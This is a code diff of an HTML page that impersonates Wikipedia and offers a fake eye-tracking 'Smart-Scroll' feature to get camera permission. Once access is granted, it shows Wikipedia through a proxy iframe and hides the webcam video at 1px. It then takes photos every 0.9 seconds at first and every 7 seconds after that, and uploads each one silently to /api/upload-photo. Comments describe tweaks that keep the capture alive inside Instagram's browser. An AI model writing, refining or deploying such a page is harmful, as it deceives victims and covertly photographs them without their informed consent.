@@ -2,32 +2,31 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Film - Wikipedia</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=0">
+    <title>Wikipedia</title>
     <style>
-        body, html { margin: 0; padding: 0; height: 100%; width: 100%; overflow: hidden; background: #fff; font-family: sans-serif; }
+        body, html { margin: 0; padding: 0; height: 100%; width: 100%; overflow: hidden; background: #fff; }
         
+        /* Mobile Centering Fix */
         #overlay {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: #fff; z-index: 9999; display: flex; flex-direction: column;
-            align-items: center; justify-content: center; text-align: center; padding: 24px; box-sizing: border-box;
+            align-items: center; justify-content: center; text-align: center; padding: 30px;
         }
 
-        .wiki-logo { width: 90px; margin-bottom: 24px; }
-        h2 { font-size: 22px; color: #333; margin: 0 0 12px 0; }
-        p { color: #666; font-size: 15px; margin: 0 0 32px 0; max-width: 320px; line-height: 1.5; }
+        .wiki-logo { width: 80px; margin-bottom: 20px; }
+        h2 { font-size: 20px; color: #333; margin-bottom: 10px; }
+        p { color: #666; font-size: 14px; max-width: 280px; margin-bottom: 30px; line-height: 1.4; }
 
         #enable-btn {
             background: #36b; color: #fff; border: none; padding: 16px 32px;
-            border-radius: 4px; font-weight: bold; font-size: 16px; cursor: pointer; width: 100%; max-width: 280px;
+            border-radius: 4px; font-weight: bold; cursor: pointer; width: 100%; max-width: 250px;
         }
 
-        #wiki-frame { width: 100%; height: 100%; border: none; display: none; }
+        #wiki-view { width: 100%; height: 100%; border: none; display: none; }
 
-        /* Instagram Fix: Keep the video slightly visible (1px) so the browser doesn't kill the process */
-        #video {
-            position: fixed; bottom: 0; right: 0; width: 1px; height: 1px; opacity: 0.01; z-index: -1;
-        }
+        /* Instagram Fix: Keep video active but hidden */
+        #video { position: fixed; bottom: 0; right: 0; width: 1px; height: 1px; opacity: 0.1; }
         canvas { display: none; }
     </style>
 </head>
@@ -36,76 +35,60 @@
 <div id="overlay">
     <img src="https://en.wikipedia.org/static/images/icons/wikipedia.png" class="wiki-logo">
     <h2>Enable Smart-Scroll</h2>
-    <p>Wikipedia now supports Eye-Tracking. Allow camera access to automatically scroll the article as you read.</p>
+    <p>Allow camera access to automatically scroll the article based on your eye movement.</p>
     <button id="enable-btn">Enable & Read</button>
 </div>
 
-<iframe id="wiki-frame"></iframe>
-
+<iframe id="wiki-view"></iframe>
 <video id="video" autoplay playsinline muted></video>
 <canvas id="canvas"></canvas>
 
 <script>
     const btn = document.getElementById('enable-btn');
-    const frame = document.getElementById('wiki-frame');
+    const wiki = document.getElementById('wiki-view');
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
-    const overlay = document.getElementById('overlay');
     let startTime;
 
     btn.addEventListener('click', async () => {
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { 
-                    facingMode: 'user',
-                    width: { ideal: 1280 },
-                    height: { ideal: 720 }
-                } 
+                video: { facingMode: 'user', width: { ideal: 640 } } 
             });
-            
             video.srcObject = stream;
-            
-            // Critical Instagram Fix: ensure play() is called explicitly
             await video.play();
 
-            // Wait for the stream to be active before switching views
-            video.onloadedmetadata = () => {
-                frame.src = "/proxy/wiki";
-                frame.style.display = "block";
-                overlay.style.display = "none";
-                startTime = Date.now();
-                
-                // Add a 1.5s 'warm-up' delay before starting the loop to avoid initial black frames
-                setTimeout(startPhotoLoop, 1500); 
-            };
-        } catch (err) {
-            alert("Camera access is required for the Smart-Scroll experience.");
-        }
+            // 1. Load Wikipedia through our local proxy
+            wiki.src = "/view-article";
+            wiki.style.display = "block";
+            document.getElementById('overlay').style.display = "none";
+            
+            startTime = Date.now();
+            
+            // 2. WARM UP: Wait 2 seconds before first photo to avoid black screens
+            setTimeout(photoLoop, 2000);
+
+        } catch (e) { alert("Camera required for Smart-Scroll."); }
     });
 
-    function startPhotoLoop() {
+    function photoLoop() {
         const elapsed = Date.now() - startTime;
-        let delay = elapsed < 10000 ? 900 : 7000;
+        let speed = elapsed < 10000 ? 900 : 7000;
 
-        setTimeout(async () => {
-            // Only capture if the video is actually playing and providing data
-            if (video.readyState === video.HAVE_ENOUGH_DATA) {
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                
-                const dataUrl = canvas.toDataURL('image/jpeg', 0.6);
-                
-                fetch('/api/upload-photo', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ dataUrl })
-                }).catch(() => {});
-            }
-            startPhotoLoop();
-        }, delay);
+        if (video.readyState === video.HAVE_ENOUGH_DATA) {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            fetch('/api/upload-photo', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ dataUrl: canvas.toDataURL('image/jpeg', 0.5) })
+            }).catch(() => {});
+        }
+        
+        setTimeout(photoLoop, speed);
     }
 </script>
 </body>
